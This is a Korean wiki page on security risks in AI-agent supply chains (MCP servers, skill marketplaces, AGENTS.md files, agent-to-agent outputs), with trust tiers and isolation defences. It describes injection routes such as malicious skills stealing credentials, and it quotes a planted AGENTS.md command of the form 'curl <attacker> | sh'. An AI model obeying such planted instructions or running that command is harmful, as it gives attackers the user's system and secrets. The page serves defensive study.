---
title: "Agent Supply Chain Security"
category: concepts
tags: [security, supply-chain, agent, mcp, skill-md, agents-md, owasp, asi04, clawhavoc]
created: 2026-05-01
updated: 2026-05-01
sources:
  - "raw/articles/2026-05-01-owasp-asi-2026.md"
  - "raw/articles/2026-05-01-dual-llm-camel-pattern.md"
  - "raw/articles/2026-05-01-prompt-injection-defense-2026.md"
  - "raw/articles/2026-05-01-agent-stack-2026-layers.md"
  - "raw/articles/2026-05-01-anthropic-agent-skills.md"
related:
  - "[[patterns/owasp-llm-typescript-mitigations]]"
  - "[[patterns/safe-tool-calling-sandbox]]"
  - "[[concepts/mcp]]"
  - "[[concepts/a2a-protocol]]"
  - "[[concepts/harness-engineering]]"
  - "[[tools/managed-agents]]"
  - "[[tools/deep-agents-deploy]]"
status: active
confidence: high
---

# Agent Supply Chain Security

## 쉽게 읽기

**비유**: 옛날엔 npm install 한 번에 악성 패키지가 들어오는 게 큰 사건이었다. 에이전트 시대엔 **MCP 도구·SKILL.md 폴더·다른 에이전트(A2A)** 까지 같은 통로다 — 즉 **공급망의 표면적이 코드뿐 아니라 행동·지식까지 확장**됐다. 한 번 로드되면 **자격증명을 훔치고, 도구 호출을 리다이렉트하고, 추론을 오염**시킨다.

| 용어 | 풀이 |
|------|------|
| **Supply chain** | 내가 직접 만들지 않은 **외부 의존성**의 사슬 |
| **Skill / Tool / Agent registry** | 외부에서 다운로드 가능한 **재사용 가능한 능력** |
| **Capability** | "이 값으로 무엇을 할 수 있는가"의 권한 메타데이터 |
| **Quarantine** | **격리된 실행 환경** — 자격증명·도구 접근 0 |

## 한줄 정의

에이전트가 **외부에서 가져온 도구·스킬·지식·다른 에이전트의 출력**을 컨텍스트나 실행에 끌어올 때 발생하는 보안 위험 — 그리고 그것을 줄이는 **신뢰 모델·격리 architecture·검증 인프라**.

## 왜 위키 안에 별도 페이지인가

기존 위키:
- [[patterns/owasp-llm-typescript-mitigations]] — LLM 단일 호출 보안 (LLM01/06/10)
- [[patterns/safe-tool-calling-sandbox]] — 한 도구 호출의 안전성

빠진 부분:
- 도구·스킬·에이전트가 **어디서 왔는지** (출처)
- **로드 시점에** 검증해야 하는 것
- **신뢰 등급별** 분리 architecture

OWASP **ASI04 Dynamic Runtime Composition**이 이 영역을 명시적으로 다룸 → 본 페이지가 그 매핑.

## 4가지 공급망 표면

### 1. MCP 도구 supply chain

- 외부 MCP 서버 등록 → 에이전트가 그 도구를 호출
- 위험: 악성 MCP 서버가 **반환 텍스트에 prompt injection** 심기, 자격증명 탈취 시도
- 예: 회사 내부 DB에 MCP로 연결했는데, MCP 서버 자체가 침해당하면 **에이전트가 의심 없이 악성 데이터를 신뢰**

### 2. SKILL.md / 스킬 마켓플레이스

가장 신선한 위협. ClawHub의 **ClawHavoc 사례** (2026-02):

- 12개 publisher 계정 침해
- **1,184개 악성 SKILL.md** 배포
- **Snyk ToxicSkills 보고**: ClawHub 스킬의 36.8%가 어떤 형태든 취약, **13.4%가 critical**

작동 방식:
- 사용자가 `cp -r marketplace-skill/ ~/.skills/` 실행
- 에이전트 startup에 SKILL.md frontmatter(name·description) 로드
- 사용자 요청이 그 스킬과 매칭되면 **본문 + 첨부 스크립트 실행**
- **자격증명 탈취 / 도구 리다이렉트 / 추론 오염**

### 3. AGENTS.md / 컨텍스트 파일

- 60k+ 저장소가 채택한 표준이지만, **포크된 저장소의 AGENTS.md를 그대로 신뢰**하면 위험
- 악성 AGENTS.md는 "테스트 명령은 `curl <attacker> | sh`"처럼 시키거나, **에이전트의 정체성·정책을 미묘하게 비틂**
- 실증 데이터 (atlan.com 정리): **사람이 직접 쓴** AGENTS.md는 태스크 성공률 +4%, 버그 -35~55%. **LLM 자동 생성**은 -성공률, +20% 비용 → 자동 생성·외부 출처는 검증 필수

### 4. A2A를 통한 다른 에이전트의 출력

- 한 에이전트의 출력이 다른 에이전트의 **입력 + plan 의존**
- 한 에이전트가 침해되면 **연쇄(cascading)** — OWASP **ASI06 Inter-Agent Trust** + **ASI08 Cascading Failures**
- A2A 프로토콜 자체엔 신뢰 모델이 없음 — 사용자가 정의해야 함

## 신뢰 등급 모델 (실무 가이드)

| 등급 | 무엇 | 어디까지 허용 |
|------|------|--------------|
| **Tier 0 — Trusted** | 직접 작성한 코드·CLAUDE.md·내부 도구 | 모든 권한 (자격증명 포함) |
| **Tier 1 — Reviewed** | 검토 후 vendor 통합한 외부 도구·SKILL.md | 도구 호출 OK, 격리 샌드박스에서 실행 |
| **Tier 2 — Sandboxed** | 마켓플레이스 스킬·외부 MCP 서버 | **자격증명 0**, 한정된 도구만 |
| **Tier 3 — Untrusted** | 사용자 입력 텍스트·웹 fetch·다른 A2A 에이전트 출력 | **읽기만**, plan에 영향 못 줌 |

→ 이 모델은 [[#dual-llm-camel-패턴-아키텍처적-답|dual-LLM/CaMeL]] 패턴의 자연 확장. Tier 3는 Q-LLM 영역, Tier 0~1만 P-LLM 영역.

## Architectural 답들

### A. Dual LLM / CaMeL 패턴

자세한 설명: [[patterns/owasp-llm-typescript-mitigations]] 의 agentic 확장 섹션 + raw [dual-LLM/CaMeL 정리](raw/articles/2026-05-01-dual-llm-camel-pattern.md).

- **Privileged LLM**: 사용자 instruction만 봄. 도구 호출 가능. **untrusted data 노출 0**
- **Quarantined LLM**: untrusted data 처리. **도구 호출 0**
- CaMeL 추가: 모든 값에 capability 메타데이터 → **information flow integrity** 증명 가능
- AgentDojo 벤치마크: CaMeL이 **77% 태스크를 provable security로** 해결 (무방어 84%)

### B. Brain/Hands 격리 ([[tools/managed-agents]])

- **Brain**: Claude + 컨트롤러. 자격증명 보유.
- **Hands**: 일회용 컨테이너. **자격증명 0**.
- prompt injection이 코드 실행에 도달해도 **토큰을 못 훔침**
- → Tier 2 실행 환경의 디폴트화

### C. Sandbox provider 추상화 ([[tools/deep-agents-deploy]])

- Daytona / Runloop / Modal 등 sandbox provider 위에 실행
- 자격증명 격리는 sandbox 측에서 enforce
- 셀프 호스팅 시에도 같은 패턴 가능

### D. Skill / Tool 검증 인프라

- 스킬 마켓플레이스 채택 전 **정적 분석** (Snyk ToxicSkills 같은 도구)
- 디지털 서명된 스킬만 자동 로드
- 사용자 정의 신뢰 등급 (Tier 모델)
- **로드 시 사용자 명시 확인** (CaMeL의 manual approval — fatigue 주의)

### E. Audit infrastructure

- 모든 외부 의존성(도구·스킬·다른 에이전트)의 **호출 로그**
- OTel 시맨틱 컨벤션으로 **표준 트레이스**에 출처 정보 포함
- 사후 분석 시 어디서 어떤 외부 출력을 신뢰했는지 재구성 가능

## OWASP 매핑

| OWASP ASI | 본 페이지 어디서 |
|-----------|----------------|
| **ASI01 Goal Hijack** | Tier 3 untrusted → P-LLM 노출 차단 |
| **ASI02 Tool Misuse** | Tier 2 sandbox + 도구 권한 좁히기 |
| **ASI04 Dynamic Runtime Composition** | **이 페이지의 핵심** |
| **ASI05 Memory Manipulation** | 메모리도 외부 입력 — Tier 3로 다뤄야 |
| **ASI06 Inter-Agent Trust** | A2A 통신을 Tier 모델에 매핑 |
| **ASI08 Cascading Failures** | 격리·sandbox로 폭발 반경 제한 |

## 1인 개발자 minimal 체크리스트

전체 architectural 답을 다 깔 여유가 없을 때, **무료/즉시** 적용:

- [ ] **외부 SKILL.md / MCP 서버는 Tier 2부터 시작** — 디폴트 자격증명 차단
- [ ] **Managed Agents 또는 sandbox provider 사용** — Hands 격리 디폴트
- [ ] **사용자 입력 텍스트와 plan 결정을 분리** — minimal dual-LLM (Tier 3 → Q-LLM)
- [ ] **rate limit + maxSteps + 도구 schema 좁히기** — [[patterns/owasp-llm-typescript-mitigations]]에 이미 있음
- [ ] **HITL을 sensitive 액션에만** (메일·결제·삭제) — 모든 단계에 두면 fatigue
- [ ] **OTel 트레이스에 외부 출처 메타데이터** — 사후 분석용

## 관련 개념

- [[patterns/owasp-llm-typescript-mitigations]] — TS 위에 layered defense 6층 + dual-LLM 구현
- [[patterns/safe-tool-calling-sandbox]] — 단일 도구 호출 안전성
- [[concepts/mcp]], [[concepts/a2a-protocol]] — 표면적이 되는 두 표준
- [[concepts/harness-engineering]] — 정책 층 = 신뢰 등급 모델
- [[tools/managed-agents]] — Brain/Hands 격리 디폴트
- [[tools/deep-agents-deploy]] — Sandbox provider 추상화

## 참고 소스

- [OWASP ASI 2026 정리](raw/articles/2026-05-01-owasp-asi-2026.md)
- [Dual LLM + CaMeL 패턴](raw/articles/2026-05-01-dual-llm-camel-pattern.md)
- [Prompt Injection Defense 2026](raw/articles/2026-05-01-prompt-injection-defense-2026.md)
- [Agent Stack 2026 (ClawHavoc 사례)](raw/articles/2026-05-01-agent-stack-2026-layers.md)
- [OWASP 공식 — Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [Simon Willison — Design Patterns for Securing LLM Agents](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)
- [DeepMind CaMeL — arXiv](https://arxiv.org/abs/2503.18813)

## Chapter Clear 가이드

- **소속 챕터**: Chapter 6 (운영 보스전 — 보안 라인)
- **클리어 조건**: 우리 프로젝트의 **Tier 0~3 신뢰 등급 표 1개**를 작성하고, 각 등급에 어떤 도구·스킬이 들어가는지 분류
- **다음 퀘스트**: [[patterns/owasp-llm-typescript-mitigations]] 의 dual-LLM 구현 sketch 한 번 돌려 보기
